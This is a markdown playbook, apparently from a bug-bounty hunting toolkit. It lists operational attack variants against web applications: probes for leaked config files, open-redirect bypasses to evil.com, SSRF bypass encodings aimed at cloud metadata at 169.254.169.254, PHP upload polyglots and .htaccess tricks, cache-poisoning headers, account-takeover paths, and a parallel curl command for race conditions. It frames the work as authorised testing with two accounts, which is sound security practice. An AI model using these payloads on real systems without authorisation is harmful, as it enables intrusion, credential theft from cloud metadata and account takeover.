# Web2 High-Yield Tables — enumeration sets that pay

> Load at **0C-Web2**, right after `feature-abuse-doctrine.md`. Companion to
> `web2-vuln-classes-26.md` (class theory + root cause). This file is the *operational*
> counterpart: the exact variant sets, fingerprint→next-move table, and scoring anchors that
> turn "I know the class" into "I tested every variant of it".
> Rule: a class is only covered when every variant row below has a result on disk.

---

## 1. Fingerprint → immediate next move

| Signal | Read as | Next move (do this, not "note it") |
|---|---|---|
| `XSRF-TOKEN` + `*_session` cookie | Laravel | `/horizon`, `/telescope`, `/storage/logs/laravel.log`, `/.env`, `/debug-sms`; `APP_DEBUG` leak pages |
| `PHPSESSID` | PHP | `/phpinfo.php`, `/.git/config`, `?=PHPB8B5F2A0-…` session-upload-progress LFI, `php://filter` chains |
| `X-Powered-By: Express` | Node | `__proto__` mass assignment, `?sort[__proto__]`, prototype pollution in JSON body, `/_next` / `/_nuxt` build manifests |
| `wp-json` link header | WordPress | `/wp-json/wp/v2/users`, `/xmlrpc.php` (brute + pingback SSRF), `/?author=1` enumeration, `/wp-config.php.bak` |
| `Drupal` / `X-Generator` | Drupal | `/user/1`, `/CHANGELOG.txt`, `?q=user/login`, JSON:API `/jsonapi/node/` |
| `JSESSIONID` + `.do` | Java/Spring | `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`, `/jolokia`, `;jsessionid=` path params |
| `ASP.NET_SessionId` | ASP.NET | `__VIEWSTATE` + `__EVENTVALIDATION` (no MAC → RCE), `/trace.axd`, `elmah.axd`, `/web.config` |
| `cf-ray` + `__cf_bm` | Cloudflare | switch to `bot-protected-target-testing`; do not conclude "blocked" from a 403 |
| SPA with `/_next/static/` | Next.js | `modern-web-framework-attacks` + `nextjs-app-security-testing`: Server Action IDs from the build manifest, RSC flight stream, source maps |

Every row is a *test*, not a note. Log the outcome with a failure label
(`hunt-intensity-and-attack-graph.md` §3).

---

## 2. Quick-win sweep (run before the deep hunt — it costs 10 minutes)

```
[ ] subdomain takeover      github.io / herokuapp / azurewebsites / s3 NoSuchBucket / readme.io / statuspage
[ ] /.git/config, /.env, /.svn/entries, /backup.zip, /db.sql, /Dockerfile
[ ] /actuator/env, /actuator/heapdump, /actuator/mappings, /jolokia/exec
[ ] JS secrets that are REAL (not curve constants, i18n strings, or public keys)
[ ] open redirect on ?redirect= ?next= ?url= ?return= ?continue= ?dest=
[ ] CORS: Origin: https://evil.com with credentials on an authenticated endpoint
[ ] S3/GCS listing: https://<bucket>.s3.amazonaws.com/?list-type=2
[ ] GraphQL introspection ON, then per-field authz on the schema
[ ] Firebase: https://<app>.firebaseio.com/.json  and  /<collection>.json
[ ] Swagger/OpenAPI: /swagger/v1/swagger.json, /openapi.json, /v1/api-docs, /swagger-ui.html, /redoc
```

**API spec first.** The OpenAPI document is the map: enumerate paths, then classify each as
KEY-REQUIRED / KEY-OPTIONAL / NO-AUTH-DECLARED. `NO-AUTH-DECLARED` is a hypothesis, not a
finding — call it without credentials and compare against the same call made by the official
front-end. Identical data = public by design → stop.

---

## 3. IDOR — ten variants (a class is not covered until all ten ran)

```
 1 path param          /api/users/123 → 456
 2 body field          {"user_id":456} / {"orgId":"…"}
 3 GraphQL node        node(id: base64("OtherType:123"))
 4 batch               ?ids=1,2,3,4,5   /  {"ids":[…]}  /  array in body
 5 nested              /orgs/{org}/users/{user}  (swap org, keep user)
 6 file reference      ?path=../other-user/file.pdf   /  /files/{id}/download
 7 predictable id      sequential int, timestamp, short uuid, base64 of int
 8 method swap         GET 403 → try PUT / PATCH / DELETE / HEAD / OPTIONS
 9 version rollback    /api/v2 blocked → /api/v1/ , /api/internal/ , /api/beta/
10 tenant headers      X-User-ID / X-Org-ID / X-Tenant / X-Account-ID set to the victim
```

Requirements: two accounts (attacker + victim), every method tested, and the response must contain
the **victim's actual data** — a 200 with an empty body is not an IDOR.

Severity: read PII = Medium · write/modify = High · admin action or full tenant control = Critical.
Full table: `hunt-idor` and `references/hackskill-idor-broken-object-authorization.md`.

---

## 4. Open redirect — eleven bypasses (for chaining into OAuth code theft)

```
 //evil.com                 →  protocol-relative
 https://target.com@evil.com
 https://target.com\\@evil.com
 %252F%252Fevil.com        →  double-encoded
 ///evil.com
 /\/evil.com
 %09//evil.com             →  tab
 https:evil.com            →  scheme-relative, no slashes
 //evil.com/%2f..
 ?next=//evil.com&next=/safe   →  parameter pollution
 unicode / IDN: //ｅvil.com, //evil。com
```

Alone it is Low and gets rejected. Chained with an OAuth `redirect_uri` that trusts the value it is
**token theft → ATO** (see `chain-to-impact`). Record which bypasses the validator accepted, per
parameter — that list is the evidence for the chain.

---

## 5. SSRF — the bypass set and the impact ladder

```
decimal   2130706433            hex 0x7f000001        octal 0177.0.0.1
short     127.1                 v6   [::1]            mapped [::ffff:127.0.0.1]
redirect  https://attacker/r → 302 → http://169.254.169.254/
DNS       rebinding domain (TTL 0) resolving to 127.0.0.1 on the second query
authority http://expected.com@127.0.0.1/   http://127.0.0.1#@expected.com/
encoding  %2523@  %09  unicode ①②⑦.⓪.⓪.①   gopher://127.0.0.1:6379/_
scheme    file://  dict://  ftp://  ldap://  gopher://
```

Impact ladder — **do not submit below rung 3:**

```
1 DNS callback only                    → Informational, NOT a finding
2 internal port open / banner          → Low, usually rejected standalone
3 cloud metadata read (IAM creds, user-data, container token) → High
4 metadata + credential use (S3/API call succeeds)            → Critical
```

For metadata, prove *readability*, not just reachability: quote the response body (redacted) in the
evidence file. `hunt-ssrf` has the per-cloud paths (AWS IMDSv1/v2, GCP, Azure, Alibaba, DigitalOcean).

---

## 6. Account takeover — seven paths, each with its own test

```
1 reset poisoning      Host / X-Forwarded-Host / X-Host on the reset request → attacker domain in link
2 token leak           reset link in Referer to an external resource; token in URL logged by analytics
3 predictable token    short numeric → bounded probe; timestamp-based → derive
4 token reuse/expiry   use twice; use after 30 days; use after password change
5 email change         change email WITHOUT current-password / without confirmation on the OLD address
6 OAuth linking        link an attacker-controlled provider identity to a victim account; unverified email
7 session fixation     session id unchanged after login; pre-set cookie accepted
```

Path 5 is the highest-yield in SaaS: the flow verifies the *new* address and never the old one, so a
stolen session (or CSRF) silently re-points the account. Test it with two accounts, and check whether
the notification to the old address can be suppressed.

---

## 7. Upload / parser bypass set

```
double ext      file.php.jpg   file.jpg.php   file.pHp   file.phtml   file.phar   file.shtml
content-type    image/png on a .php payload
magic bytes     GIF89a; <?php …            (polyglot)
htaccess        upload .htaccess with AddType, then upload the payload
svg             <svg onload=…>  → stored XSS when served inline
zip             zip-slip ../ path, then extract via an import feature
race            upload + immediate request before the AV/rename job finishes
serving         does /uploads/x.php execute? does /uploads/x.jpg return text/html?
```

Impact gate: execution = RCE (Critical) · served inline with attacker content-type = stored XSS
(High on admin-facing surfaces) · path traversal on extract = High.

---

## 8. Cache poisoning / deception — the unkeyed inputs worth trying

```
headers   X-Forwarded-Host  X-Forwarded-Scheme  X-Original-URL  X-Rewrite-URL  X-Host
          X-Forwarded-Port  X-HTTP-Method-Override  Forwarded
params    ?a=v;poison=xss          (param cloaking / delimiter confusion)
          ?utm=…&cachebust=…       (unkeyed param that reaches the body)
fat GET   GET with a body that the origin honours but the cache does not key on
deception /account/settings.css → /account/settings  (path confusion, cache serves authenticated HTML)
```

Proof bar: the poisoned response must be served to a **different** client/session, and the evidence
must show the cache hit (`cf-cache-status: HIT`, `X-Cache: HIT`, or a second clean session receiving
the injected body). A reflected header on your own response is not cache poisoning.

---

## 9. Race conditions — one command, real concurrency

```bash
# 20 parallel requests on a single-use resource (own account, own coupon)
seq 20 | xargs -P 20 -I{} curl -s -X POST "https://TARGET/redeem" \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' -o "out/{}.txt" -w "%{http_code}\n" | sort | uniq -c
```

Targets: coupon/gift redemption, wallet transfer or withdraw, vote/like counters, OTP verification,
seat/quota allocation, refund + entitlement. Success = **more than one** success response with a
matching state change (balance, counter, entitlement) — count them, don't eyeball one.

For sub-millisecond precision use single-packet attack (`hunt-race-condition`, HTTP/2 last-byte sync);
plain `xargs` is enough to prove most business-logic double-spends.

---

## 10. Chain shapes worth actively building (A → B → C)

| A | B | C | Terminal impact |
|---|---|---|---|
| IDOR read | write on the same object | — | full data manipulation |
| SSRF | cloud metadata | IAM credential use | infra takeover |
| stored XSS | missing HttpOnly / admin views it | session or action theft | ATO / admin ATO |
| open redirect | OAuth `redirect_uri` trust | code interception | ATO |
| bucket listing | JS bundle secret | API/OAuth abuse | data breach |
| no rate limit | OTP brute | — | ATO |
| GraphQL introspection | missing field-level authz | mass query | mass PII |
| CORS reflect | credentialed request | data theft | cross-tenant read |
| host header | reset poisoning | mailbox control | ATO |
| email change w/o old-address verify | password reset | — | ATO |

Protocol: CONFIRM A → MAP SIBLINGS → TEST SIBLINGS → CHAIN → QUANTIFY (N users / $X / N records)
→ **one report per chain**. Composition rules: `chain-to-impact` → Multi-Low composition.

---

## 11. CVSS anchors (start here, then argue with evidence)

| Finding | Base | Typical vector |
|---|---|---|
| IDOR read (auth) | 6.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| IDOR write (auth) | 7.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| Auth bypass → admin | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| SQLi with exfil | 8.6 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| SSRF → metadata creds | 9.1 | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N |
| Race double-spend | 7.5 | AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N |
| JWT `alg:none` accepted | 9.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |

The program's own scale wins over CVSS when they differ (`counter-downgrade-playbook.md` §0).
Never let the vector contradict the impact paragraph — triagers read the vector first.

---

## 12. Note-taking shape (a hunt without this is a hunt you will repeat)

```markdown
# TARGET: <host> — SESSION <n>   mode=<NORMAL|AGGRESSIVE|HUNTER|DEEP HUNT>

## Leads
- [14:22] /api/v2/invoices/{id} no auth visible → testing IDOR variants 1-4

## Dead ends
- /admin IP-restricted — 15 bypass headers tried, all 403 (BLOCKED)

## Anomalies
- GET /api/export returns 200 without a cookie
- POST /api/check-user 150 ms vs 8 ms baseline (user enumeration?)

## Rabbit holes (max 15 min each)
- [ ] 10 min: JWT kid injection

## Confirmed
- [15:10] IDOR /api/invoices/{id} read+write (VERIFIED, 2 accounts, evidence/invoices/)
```

Sections map to the failure-label vocabulary, so the note file *is* the coverage ledger.
